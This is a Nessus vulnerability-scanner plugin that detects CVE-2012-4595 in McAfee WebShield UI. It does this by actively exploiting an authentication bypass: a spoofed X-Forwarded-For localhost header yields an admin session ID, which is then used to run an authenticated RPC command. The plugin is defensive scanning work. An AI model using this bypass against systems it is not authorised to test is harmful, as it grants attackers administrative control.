#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59110);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/12/19 20:46:16 $");

  script_cve_id("CVE-2012-4595");
  script_bugtraq_id(55184);
  script_osvdb_id(84851);
  script_xref(name:"TRA", value:"TRA-2012-17");
  script_xref(name:"MCAFEE-SB", value:"SB10026");

  script_name(english:"McAfee WebShield UI Authentication Bypass (SB10026)");
  script_summary(english:"Tries to bypass authentication and run an RPC command.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application hosted on the remote web server is affected by an
authentication bypass vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of the McAfee WebShield UI hosted on the remote web server
is affected by an authentication bypass vulnerability. It is possible
to get a valid session ID as the administrative user by making a
specially crafted request to /cgi-bin/localadmin. A remote,
unauthenticated attacker can exploit this to perform administrative
actions. After gaining administrative privileges, an attacker can take
complete control of the system."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2012-17");
  script_set_attribute(attribute:"see_also",value:"https://kc.mcafee.com/corporate/index?page=content&id=SB10026");
  script_set_attribute(
    attribute:"solution",
    value:"Apply the relevant hotfix specified in McAfee Security Bulletin SB10026."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"McAfee Email Gateway 7.0 File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/16");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:mcafee:email_and_web_security");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:mcafee:email_gateway");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("mcafee_webshield_web_ui_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/mcafee_webshield");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:443);
install = get_install_from_kb(appname:'mcafee_webshield', port:port, exit_on_fail:TRUE);
rpc = install['dir'] + '/cgi-bin/rpc/';

# exploit the auth bypass vulnerability to get a SID as admin
page = install['dir'] + '/cgi-bin/localadmin';
hdr = make_array('X-Forwarded-For', '127.0.0.1');
res = http_send_recv3(
  method:'GET',
  item:page,
  port:port,
  exit_on_fail:TRUE,
  add_headers:hdr
);

match = eregmatch(string:res[2], pattern:'var sessionId = "((SID:)?[A-Za-z0-9-]+)"');
if (isnull(match))
  audit(AUDIT_RESP_BAD, port, 'the authentication bypass attempt');
else
  sid = 'SID%3D' + match[1];

enable_cookiejar();
set_http_cookie(name:'ws_session', value:sid);

# run a command that requires authentication. loadSystemState returns all the info on the 'About' page
cmd = 'loadSystemState';
res = http_send_recv3(
  method:'GET',
  item:rpc + cmd,
  port:port,
  exit_on_fail:TRUE,
  add_headers:hdr
);
json = res[2];

# logoff
res = http_send_recv3(
  method:'GET',
  item:rpc + 'logoff',
  port:port,
  exit_on_fail:TRUE,
  add_headers:hdr
);

# check if the command was run successfully
info = NULL;

# json key => user friendly label
data = make_array(
  's.description', 'Product description',
  's.product.version', 'Product version',
  's.product.package', 'Product package',
  's.product.build', 'Product build',
  's.product.tag', 'Product tag',
  's.av.mcafee.engine.version', 'Anti-Virus Engine',
  's.av.mcafee.dat.version', 'Anti-Virus DAT'
);

foreach key (sort(keys(data)))
{
  pattern = '"' + key + '":"([^"]+)"';
  match = eregmatch(string:json, pattern:pattern);
  if (isnull(match))
    continue;

  label = data[key];
  info += '  ' + label + ' : ' + match[1] + '\n';
}

if (isnull(info))
  audit(AUDIT_RESP_BAD, port, cmd);

if (report_verbosity > 0)
{
  report =
    '\nNessus was able to obtain the following information by executing\n' +
    'the "' + cmd + '" RPC command as an authenticated user :\n\n' +
    info;
  security_hole(port:port, extra:report);
}
else security_hole(port);

